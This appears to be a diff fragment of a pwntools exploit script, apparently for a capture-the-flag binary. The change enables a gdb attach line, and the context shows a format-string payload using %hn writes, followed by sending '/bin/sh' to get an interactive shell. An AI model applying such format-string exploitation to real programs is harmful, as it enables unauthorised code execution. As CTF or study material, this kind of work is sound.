@@ -32,7 +32,7 @@ else:
 #change 2 MS bytes
 buf += "%" + str(count) + "x%" + str(stack_num+1) + "$hn"
 
-#gdb.attach(p)
+gdb.attach(p)
 p.sendline(buf)
 p.sendline("/bin/sh")
 p.interactive()
